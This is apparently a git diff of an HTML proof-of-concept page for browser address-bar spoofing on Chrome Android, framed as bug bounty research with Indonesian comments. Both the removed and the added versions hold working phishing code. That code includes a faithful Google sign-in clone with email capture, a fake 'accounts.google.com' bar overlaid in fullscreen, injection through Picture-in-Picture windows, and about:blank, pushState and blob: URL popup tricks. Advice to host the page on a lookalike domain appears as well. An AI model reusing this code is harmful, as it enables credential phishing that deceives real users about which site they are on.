@@ -3,583 +3,569 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Account</title>
-    <!-- PWA Manifest inline via link — makes it installable, hides browser chrome -->
-    <link rel="manifest" id="manifest-link">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="theme-color" content="#ffffff">
+    <title>Security Research</title>
     <style>
-        :root {
-            --google-blue: #1a73e8;
-            --google-red: #ea4335;
-            --google-green: #34a853;
-            --google-yellow: #fbbc04;
-        }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
-
         body {
-            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            background: #0d1117;
+            color: #e6edf3;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            padding: 24px 16px;
         }
 
-        /* ═══════════════════════════════════
-           LAUNCHER SCREEN
-        ═══════════════════════════════════ */
-        #launcher {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            background: #202124;
-            color: #e8eaed;
-            padding: 40px 24px;
-            text-align: center;
+        h1 { font-size: 16px; color: #58a6ff; margin-bottom: 4px; }
+        .sub { font-size: 12px; color: #8b949e; margin-bottom: 24px; }
+
+        .section {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
         }
 
-        #launcher h1 { font-size: 20px; font-weight: 400; margin-bottom: 8px; color: #e8eaed; }
-        #launcher p  { font-size: 13px; color: #9aa0a6; margin-bottom: 32px; line-height: 1.6; max-width: 320px; }
+        .section-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #f0883e;
+            margin-bottom: 6px;
+        }
 
-        .method-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
+        .section-desc {
+            font-size: 11px;
+            color: #8b949e;
+            margin-bottom: 14px;
+            line-height: 1.6;
+        }
+
+        .section-desc b { color: #e6edf3; }
+        .section-desc code {
+            background: #0d1117;
+            padding: 1px 5px;
+            border-radius: 3px;
+            font-family: monospace;
+            color: #79c0ff;
+            font-size: 11px;
+        }
+
+        .btn {
+            display: block;
             width: 100%;
-            max-width: 360px;
-            margin-bottom: 20px;
-        }
-
-        .method-btn {
-            padding: 16px 12px;
-            border-radius: 12px;
-            border: 1px solid #3c4043;
-            background: #2d2f31;
-            color: #e8eaed;
-            font-size: 12px;
-            cursor: pointer;
-            text-align: left;
-            line-height: 1.5;
-        }
-        .method-btn .label { font-weight: 600; font-size: 13px; color: #8ab4f8; display: block; margin-bottom: 4px; }
-        .method-btn .desc  { color: #9aa0a6; font-size: 11px; }
-        .method-btn:active { background: #3c4043; }
-
-        .launch-all-btn {
-            width: 100%;
-            max-width: 360px;
-            padding: 18px;
-            background: var(--google-blue);
-            color: white;
+            padding: 12px;
+            border-radius: 6px;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
+            font-size: 13px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 8px;
-        }
-
-        #status-bar {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #5f6368;
-            font-family: monospace;
-            max-width: 360px;
-            text-align: left;
-            line-height: 1.8;
-        }
-
-        /* ═══════════════════════════════════
-           PAYLOAD — Realistic Google Sign-In
-        ═══════════════════════════════════ */
-        #payload {
-            display: none;
-            min-height: 100vh;
-            background: #fff;
-            flex-direction: column;
-        }
-
-        /* Fake address bar — shown only in fullscreen mode to spoof URL */
-        .fake-addressbar {
-            display: none;
-            background: #f1f3f4;
-            padding: 8px 16px;
-            font-size: 13px;
-            color: #202124;
-            border-bottom: 1px solid #dadce0;
-            align-items: center;
-            gap: 8px;
-        }
-        .fake-addressbar.visible { display: flex; }
-        .fake-ab-lock { color: #1e8e3e; font-size: 14px; }
-        .fake-ab-url  { flex: 1; color: #202124; font-size: 13px; }
-        .fake-ab-url span { color: #1a73e8; }
-
-        .signin-container {
-            flex: 1;
-            display: flex;
-            align-items: flex-start;
-            justify-content: center;
-            padding: 48px 24px 40px;
-        }
-
-        .signin-card {
-            width: 100%;
-            max-width: 400px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 48px 40px 36px;
-        }
-
-        @media (max-width: 480px) {
-            .signin-card {
-                border: none;
-                padding: 32px 24px 24px;
-            }
-        }
-
-        .google-logo {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 24px;
-        }
-
-        .signin-title {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            text-align: center;
             margin-bottom: 8px;
-            font-family: 'Google Sans', Arial, sans-serif;
-        }
-
-        .signin-subtitle {
-            font-size: 16px;
-            color: #202124;
-            text-align: center;
-            margin-bottom: 32px;
-            font-weight: 400;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 24px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 13px 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            color: #202124;
-            outline: none;
-            transition: border-color 0.2s;
-            background: transparent;
-        }
-
-        .input-group input:focus {
-            border-color: var(--google-blue);
-            border-width: 2px;
-        }
-
-        .input-group label {
-            position: absolute;
-            left: 12px;
-            top: 14px;
-            font-size: 16px;
-            color: #80868b;
-            pointer-events: none;
-            transition: all 0.15s;
-            background: white;
-            padding: 0 4px;
-        }
-
-        .input-group input:focus ~ label,
-        .input-group input:not(:placeholder-shown) ~ label {
-            top: -8px;
-            font-size: 12px;
-            color: var(--google-blue);
-        }
-
-        .forgot-link {
-            font-size: 14px;
-            color: var(--google-blue);
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .signin-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 36px;
-        }
-
-        .create-account-btn {
-            font-size: 14px;
-            color: var(--google-blue);
-            background: none;
-            border: none;
-            font-weight: 500;
-            cursor: pointer;
-            padding: 10px 0;
             font-family: inherit;
+            text-align: left;
         }
 
-        .next-btn {
-            background: var(--google-blue);
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            font-family: inherit;
-            letter-spacing: 0.25px;
+        .btn-t1 { background: #1f6feb; color: white; }
+        .btn-t2 { background: #388bfd22; color: #58a6ff; border: 1px solid #1f6feb; }
+        .btn-t3 { background: #da3633; color: white; }
+        .btn-t4 { background: #238636; color: white; }
+
+        #log {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #3fb950;
+            line-height: 1.8;
+            min-height: 80px;
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 16px;
         }
 
-        .next-btn:active { background: #1557b0; }
-
-        /* ═══════════════════════════════════
-           PiP PAYLOAD (for documentPiP mode)
-        ═══════════════════════════════════ */
-        #pip-payload {
-            display: none;
-            background: white;
-            padding: 20px;
-            min-height: 100vh;
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 999px;
+            font-size: 10px;
+            font-weight: 600;
+            margin-left: 6px;
+            vertical-align: middle;
         }
+        .badge-high   { background: #da363340; color: #f85149; border: 1px solid #da3633; }
+        .badge-med    { background: #f0883e40; color: #f0883e; border: 1px solid #f0883e; }
+        .badge-info   { background: #1f6feb40; color: #58a6ff; border: 1px solid #1f6feb; }
     </style>
 </head>
 <body>
 
-<!-- ═══════════════ LAUNCHER ═══════════════ -->
-<div id="launcher">
-    <h1>UI Redressing PoC — Multi-Vector</h1>
-    <p style="color:#9aa0a6;font-size:12px;margin-bottom:24px;">
-        Bug Bounty Research · Chrome Android · Fullscreen Spoofing<br>
-        Pilih vector atau launch semua sekaligus
-    </p>
+<h1>Popup Address Bar Spoofing — Research PoC</h1>
+<p class="sub">window.open() attack surface · about:blank · blob: · navigation timing</p>
 
-    <div class="method-grid">
-        <button class="method-btn" onclick="launchVector('fullscreen')">
-            <span class="label">V1 · Fullscreen</span>
-            <span class="desc">requestFullscreen() + fake address bar overlay</span>
-        </button>
-        <button class="method-btn" onclick="launchVector('pip')">
-            <span class="label">V2 · Document PiP</span>
-            <span class="desc">documentPictureInPicture — no hint, floating window</span>
-        </button>
-        <button class="method-btn" onclick="launchVector('popup')">
-            <span class="label">V3 · Popup Spoof</span>
-            <span class="desc">window.open() minimal chrome, custom geometry</span>
-        </button>
-        <button class="method-btn" onclick="launchVector('pwa')">
-            <span class="label">V4 · PWA Spoof</span>
-            <span class="desc">Add to homescreen prompt + standalone mode</span>
-        </button>
+<!-- ═══════════════ TECHNIQUE 1 ═══════════════ -->
+<div class="section">
+    <div class="section-title">
+        T1 · about:blank → document.write() → navigate
+        <span class="badge badge-high">HIGH IMPACT</span>
     </div>
-
-    <button class="launch-all-btn" onclick="launchVector('fullscreen')">
-        🚀 Launch Most Powerful (V1 + Fake URL Bar)
+    <div class="section-desc">
+        Buka <code>about:blank</code> popup, inject konten via <code>document.write()</code>,
+        lalu panggil <code>history.pushState()</code> dari dalam popup untuk ubah URL bar
+        ke target domain. <b>about:blank mewarisi origin opener</b> sehingga
+        pushState bisa mengubah URL ke path apapun dalam origin yang sama.
+        <br><br>
+        <b>Variant tambahan:</b> Setelah write, popup navigate ke
+        <code>blob:</code> URL yang mewarisi origin — address bar menunjukkan
+        <code>blob:https://attacker.com/uuid</code> yang terlihat seperti origin legit.
+    </div>
+    <button class="btn btn-t1" onclick="runT1_basic()">
+        T1a · about:blank + document.write + pushState
     </button>
-
-    <div id="status-bar">Ready. Tap a vector above.</div>
+    <button class="btn btn-t2" onclick="runT1_navigate()">
+        T1b · about:blank → navigate to blob: URL (origin inherit)
+    </button>
 </div>
 
-<!-- ═══════════════ MAIN PAYLOAD ═══════════════ -->
-<div id="payload">
-    <!-- Fake address bar — only visible in fullscreen -->
-    <div class="fake-addressbar" id="fake-addressbar">
-        <span class="fake-ab-lock">🔒</span>
-        <span class="fake-ab-url"><span>accounts.google.com</span></span>
-        <span style="color:#80868b;font-size:18px;">⋮</span>
+<!-- ═══════════════ TECHNIQUE 2 ═══════════════ -->
+<div class="section">
+    <div class="section-title">
+        T2 · Popup + Fullscreen dari dalam popup context
+        <span class="badge badge-med">MEDIUM</span>
     </div>
-
-    <div class="signin-container">
-        <div class="signin-card">
-            <div class="google-logo">
-                <!-- Inline SVG Google logo — no external dependency -->
-                <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
-                    <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
-                    <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
-                    <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
-                    <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
-                    <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
-                </svg>
-            </div>
-
-            <h1 class="signin-title">Sign in</h1>
-            <p class="signin-subtitle">to continue to Gmail</p>
-
-            <div class="input-group">
-                <input type="email" id="email-field" placeholder=" " autocomplete="email">
-                <label>Email or phone</label>
-            </div>
-
-            <a href="#" class="forgot-link" onclick="return false;">Forgot email?</a>
-
-            <div style="margin-top:32px;font-size:14px;color:#202124;line-height:1.6;">
-                Not your computer? Use Guest mode to sign in privately.
-                <a href="#" style="color:var(--google-blue);text-decoration:none;" onclick="return false;">Learn more</a>
-            </div>
-
-            <div class="signin-footer">
-                <button class="create-account-btn" onclick="return false;">Create account</button>
-                <button class="next-btn" onclick="captureAndAlert()">Next</button>
-            </div>
-        </div>
+    <div class="section-desc">
+        Buka popup via <code>window.open()</code>, inject payload,
+        lalu panggil <code>requestFullscreen()</code> dari <b>dalam popup</b> bukan parent.
+        Fullscreen dari popup context → Chrome Android kadang tidak
+        attach hint ke popup window, atau hint muncul di parent bukan popup.
+        <br><br>
+        <b>Tambahan:</b> Popup fullscreen sambil parent window melakukan
+        history flood untuk saturasi navigation manager.
     </div>
+    <button class="btn btn-t3" onclick="runT2_popupFullscreen()">
+        T2 · Popup context fullscreen (hint di parent?)
+    </button>
 </div>
+
+<!-- ═══════════════ TECHNIQUE 3 ═══════════════ -->
+<div class="section">
+    <div class="section-title">
+        T3 · blob: URL popup — address bar shows partial origin
+        <span class="badge badge-high">HIGH IMPACT</span>
+    </div>
+    <div class="section-desc">
+        Buat <code>Blob</code> berisi payload HTML, generate
+        <code>URL.createObjectURL()</code>, buka via <code>window.open()</code>.
+        <br><br>
+        Address bar popup akan menampilkan:
+        <code>blob:https://[opener-origin]/[uuid]</code>
+        <br><br>
+        <b>Key insight:</b> Jika attacker host di domain yang mirip target
+        (misalnya <code>accounts-google.com</code>), address bar akan tampil
+        <code>blob:https://accounts-google.com/...</code> — sangat convincing.
+        Tidak ada fullscreen, tidak ada hint, tidak ada indikator suspicious.
+    </div>
+    <button class="btn btn-t4" onclick="runT3_blobPopup()">
+        T3 · blob: URL popup — no fullscreen, no hint
+    </button>
+</div>
+
+<!-- ═══════════════ TECHNIQUE 4 ═══════════════ -->
+<div class="section">
+    <div class="section-title">
+        T4 · window.open() + location.replace() timing race
+        <span class="badge badge-med">TIMING RACE</span>
+    </div>
+    <div class="section-desc">
+        Buka popup ke URL target legit, lalu race antara
+        <code>location.replace()</code> dan rendering. Pada beberapa versi Chrome
+        Android, ada race window dimana address bar masih menampilkan URL lama
+        saat konten sudah diganti.
+        <br><br>
+        <b>Classic technique</b> — dicoba dengan timing yang lebih surgical
+        menggunakan <code>requestAnimationFrame</code> chain.
+    </div>
+    <button class="btn btn-t2" onclick="runT4_locationRace()">
+        T4 · location.replace() timing race
+    </button>
+</div>
+
+<div id="log">Ready. Tap a technique above.<br></div>
 
 <script>
 // ═══════════════════════════════════════════════════
-// UTILITIES
+// SHARED: Google Sign-In payload HTML
 // ═══════════════════════════════════════════════════
-function log(msg) {
-    const sb = document.getElementById('status-bar');
-    if (sb) sb.innerHTML += `<br>· ${msg}`;
-    console.log('[PoC]', msg);
+function getPayloadHTML(title, subtitle, captionColor) {
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Google Account</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;display:flex;align-items:flex-start;justify-content:center;min-height:100vh;padding:40px 20px}
+.card{width:100%;max-width:400px;border:1px solid #dadce0;border-radius:8px;padding:40px 32px 32px}
+@media(max-width:480px){.card{border:none;padding:32px 20px 24px}}
+.logo{text-align:center;margin-bottom:20px}
+h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
+.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:28px}
+.caption{font-size:11px;color:${captionColor||'#80868b'};text-align:center;margin-bottom:16px;font-family:monospace}
+.inp-wrap{position:relative;margin-bottom:20px}
+input{width:100%;padding:13px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none}
+input:focus{border:2px solid #1a73e8}
+label{position:absolute;left:12px;top:14px;font-size:16px;color:#80868b;pointer-events:none;transition:all .15s;background:#fff;padding:0 4px}
+input:focus~label,input:not(:placeholder-shown)~label{top:-8px;font-size:12px;color:#1a73e8}
+.footer{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
+.link-btn{font-size:14px;color:#1a73e8;background:none;border:none;font-weight:500;cursor:pointer;padding:10px 0;font-family:inherit}
+.next{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+<path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+<path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+<path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+<path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+<path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+<path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
+</svg>
+</div>
+<h1>${title}</h1>
+<p class="sub">${subtitle}</p>
+<div class="inp-wrap">
+<input type="email" id="ef" placeholder=" " autocomplete="email">
+<label>Email or phone</label>
+</div>
+<div class="footer">
+<button class="link-btn">Create account</button>
+<button class="next" id="nb">Next</button>
+</div>
+</div>
+<script>
+document.getElementById('nb').onclick = function(){
+    var e=document.getElementById('ef').value;
+    alert('PoC Success\\nEmail: '+(e||'(empty)'));
+};
+setTimeout(function(){document.getElementById('ef').focus();},400);
+<\/script>
+</body></html>`;
 }
 
-function captureAndAlert() {
-    const email = document.getElementById('email-field').value;
-    alert(`PoC Confirmed\n\nCaptured: ${email || '(empty)'}\nVector: ${window._activeVector || 'unknown'}\n\nIn real attack: credentials sent to attacker server`);
+const logEl = document.getElementById('log');
+function log(msg, color) {
+    logEl.innerHTML += `<span style="color:${color||'#3fb950'}">[${performance.now().toFixed(0)}ms] ${msg}</span><br>`;
+    logEl.scrollTop = logEl.scrollHeight;
 }
+function logE(msg) { log(msg, '#f85149'); }
+function logW(msg) { log(msg, '#f0883e'); }
+function logI(msg) { log(msg, '#58a6ff'); }
 
 // ═══════════════════════════════════════════════════
-// VECTOR 1: FULLSCREEN + FAKE ADDRESS BAR
-// Most impactful — fullscreen hides ALL browser chrome
-// Fake address bar overlay shows "accounts.google.com"
-// Hint muncul <1ms tapi auto-dismiss, payload tetap visible
+// T1a: about:blank + document.write() + history.pushState
+//
+// about:blank mewarisi origin opener.
+// Setelah document.write(), popup berada di origin opener.
+// history.pushState bisa ubah path — tapi tidak bisa cross-origin.
+// NAMUN: Kita bisa ubah ke path yang terlihat seperti target.
+//
+// Observasi yang dicari:
+// - Address bar popup menampilkan apa setelah pushState?
+// - Apakah ada window di mana URL lama masih terlihat?
 // ═══════════════════════════════════════════════════
-async function launchFullscreen() {
-    window._activeVector = 'V1-Fullscreen';
-    log('V1: Requesting fullscreen...');
+function runT1_basic() {
+    logI('T1a: Opening about:blank popup...');
 
-    const launcher = document.getElementById('launcher');
-    const payload  = document.getElementById('payload');
-    const fakeAB   = document.getElementById('fake-addressbar');
+    const popup = window.open('about:blank', '_blank',
+        'width=' + screen.width + ',height=' + screen.height);
 
-    // Show payload first (in user gesture context)
-    launcher.style.display = 'none';
-    payload.style.display  = 'flex';
+    if (!popup) { logE('T1a: Popup blocked!'); return; }
 
+    logI('T1a: Popup opened, address bar shows: about:blank');
+
+    // Write payload immediately — popup still in about:blank context
+    popup.document.open();
+    popup.document.write(getPayloadHTML('Sign in', 'to continue to Gmail', '#1a73e8'));
+    popup.document.close();
+    logI('T1a: Payload written via document.write()');
+
+    // Setelah document.write + close, popup origin = opener origin
+    // Coba pushState untuk ubah URL di address bar popup
     try {
-        await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-        log('V1: Fullscreen granted');
-
-        // Show fake address bar AFTER fullscreen — real address bar is now hidden
-        // This is the core spoof: user sees "🔒 accounts.google.com" in our fake bar
-        fakeAB.classList.add('visible');
-        log('V1: Fake address bar injected — shows accounts.google.com');
-
-        // Focus email field for realism
-        setTimeout(() => {
-            document.getElementById('email-field')?.focus();
-        }, 300);
-
+        // Path manipulation — ubah URL bar ke sesuatu yang lebih meyakinkan
+        popup.history.pushState({}, '', '/signin/v2/identifier');
+        logI('T1a: pushState → /signin/v2/identifier');
+        logW('T1a: OBSERVE — address bar popup menampilkan apa?');
     } catch(e) {
-        log('V1: FS error — ' + e.message);
+        logE('T1a: pushState failed: ' + e.message);
     }
 
-    // Listen for fullscreen exit — hide fake bar
-    document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement) {
-            fakeAB.classList.remove('visible');
-            log('V1: Fullscreen exited, fake bar hidden');
+    // Tambahan: replaceState untuk lebih bersih (no history entry)
+    setTimeout(() => {
+        try {
+            popup.history.replaceState({}, '', '/u/0/AccountChooser');
+            logI('T1a: replaceState → /u/0/AccountChooser');
+        } catch(e) {
+            logE('T1a: replaceState failed: ' + e.message);
         }
-    });
+    }, 100);
 }
 
 // ═══════════════════════════════════════════════════
-// VECTOR 2: DOCUMENT PICTURE-IN-PICTURE
-// Chrome 116+ Android — opens floating window
-// NO fullscreen hint whatsoever
-// Window floats over all other apps
+// T1b: about:blank → navigate to blob: URL
+//
+// 1. Buka about:blank popup
+// 2. Buat blob dari payload
+// 3. Navigate popup ke blob URL
+//
+// Address bar akan menampilkan:
+//   blob:https://[current-domain]/[uuid]
+//
+// Jika dihost di domain mirip target = very convincing
+// Tidak ada fullscreen, tidak ada hint apapun
 // ═══════════════════════════════════════════════════
-async function launchPiP() {
-    window._activeVector = 'V2-PiP';
-    log('V2: Checking documentPictureInPicture support...');
+function runT1_navigate() {
+    logI('T1b: Creating blob payload...');
 
-    if (!('documentPictureInPicture' in window)) {
-        log('V2: API not available on this browser/version');
-        log('V2: Requires Chrome 116+ — falling back to V1');
-        await launchFullscreen();
-        return;
-    }
+    const html = getPayloadHTML('Sign in', 'to continue to Gmail', '#34a853');
+    const blob = new Blob([html], { type: 'text/html' });
+    const blobURL = URL.createObjectURL(blob);
 
-    try {
-        log('V2: Opening PiP window...');
+    logI('T1b: blob URL created: ' + blobURL.substring(0, 60) + '...');
 
-        // PiP window — no address bar, no browser chrome, no fullscreen hint
-        const pipWindow = await window.documentPictureInPicture.requestWindow({
-            width: Math.min(window.screen.width, 420),
-            height: Math.min(window.screen.height, 680),
-        });
+    // Buka popup langsung ke blob URL
+    const popup = window.open(blobURL, '_blank',
+        'width=' + screen.width + ',height=' + screen.height);
 
-        log('V2: PiP window opened — NO hint, no browser chrome');
+    if (!popup) { logE('T1b: Popup blocked!'); return; }
 
-        // Clone stylesheet to PiP window
-        [...document.styleSheets].forEach(sheet => {
-            try {
-                const styleEl = document.createElement('style');
-                [...sheet.cssRules].forEach(rule => {
-                    styleEl.textContent += rule.cssText;
-                });
-                pipWindow.document.head.appendChild(styleEl);
-            } catch(e) {}
-        });
+    logW('T1b: OBSERVE — address bar shows: blob:https://[origin]/[uuid]');
+    logI('T1b: No fullscreen, no hint, no browser chrome warnings');
+    logI('T1b: If hosted on accounts-google.com → very convincing URL');
 
-        // Build payload in PiP window
-        pipWindow.document.body.style.cssText = 'margin:0;padding:0;font-family:Google Sans,Arial,sans-serif;background:#fff;';
-        pipWindow.document.body.innerHTML = document.getElementById('payload').innerHTML;
-
-        // Inject capture handler into PiP window
-        const script = pipWindow.document.createElement('script');
-        script.textContent = `
-            document.querySelector('.next-btn').onclick = () => {
-                const email = document.getElementById('email-field').value;
-                alert('PiP PoC Success\\nEmail: ' + (email||'(empty)') + '\\nNo fullscreen hint shown!');
-            };
-        `;
-        pipWindow.document.body.appendChild(script);
-
-        log('V2: Payload injected into PiP — user sees Google login floating window');
-
-    } catch(e) {
-        log('V2: PiP failed: ' + e.message + ' — falling back to V1');
-        await launchFullscreen();
-    }
+    // Revoke blob URL after load to clean up memory
+    setTimeout(() => URL.revokeObjectURL(blobURL), 5000);
 }
 
 // ═══════════════════════════════════════════════════
-// VECTOR 3: POPUP WINDOW SPOOF
-// window.open() dengan geometry minimal
-// Tidak ada tab bar, back button tersembunyi
-// Combined dengan history manipulation untuk URL spoof
+// T2: Popup context fullscreen
+//
+// requestFullscreen() dipanggil dari dalam popup, bukan parent.
+// Hipotesis: hint attach ke parent window context,
+// bukan ke popup window → popup fullscreen tanpa hint?
 // ═══════════════════════════════════════════════════
-async function launchPopup() {
-    window._activeVector = 'V3-Popup';
-    log('V3: Opening spoofed popup...');
+function runT2_popupFullscreen() {
+    logI('T2: Opening popup for fullscreen test...');
 
-    const w = window.screen.width;
-    const h = window.screen.height;
+    const popup = window.open('about:blank', '_blank',
+        'width=' + screen.width + ',height=' + screen.height);
 
-    // Buka popup dengan ukuran fullscreen tapi sebagai window terpisah
-    // Pada Chrome Android, popup minimal = hanya URL bar tanpa tab strip
-    const popup = window.open(
-        'www.google.com',
-        'google_signin',
-        `width=${w},height=${h},left=0,top=0,menubar=no,toolbar=no,location=yes,status=no`
-    );
+    if (!popup) { logE('T2: Popup blocked!'); return; }
 
-    if (!popup || popup.closed) {
-        log('V3: Popup blocked — falling back to V1');
-        await launchFullscreen();
-        return;
-    }
-
-    // Inject payload ke popup
-    const payloadHTML = document.getElementById('payload').outerHTML;
-    const styleHTML = [...document.querySelectorAll('style')].map(s => s.outerHTML).join('');
+    // Build payload dengan fullscreen trigger dari dalam popup
+    const payloadWithFS = getPayloadHTML('Sign in', 'to continue to Gmail', '#f0883e')
+        .replace('</body>', `
+        <script>
+        // requestFullscreen dari popup context
+        // Berbeda dengan parent context — hint behavior mungkin beda
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                document.documentElement.requestFullscreen({navigationUI:'hide'})
+                    .then(function() {
+                        console.log('[T2] Popup fullscreen granted');
+                        // Cek apakah hint muncul di popup atau di parent
+                    })
+                    .catch(function(e) {
+                        console.log('[T2] FS error:', e.message);
+                    });
+            }, 300);
+        });
+        <\/script>
+        </body>`);
 
     popup.document.open();
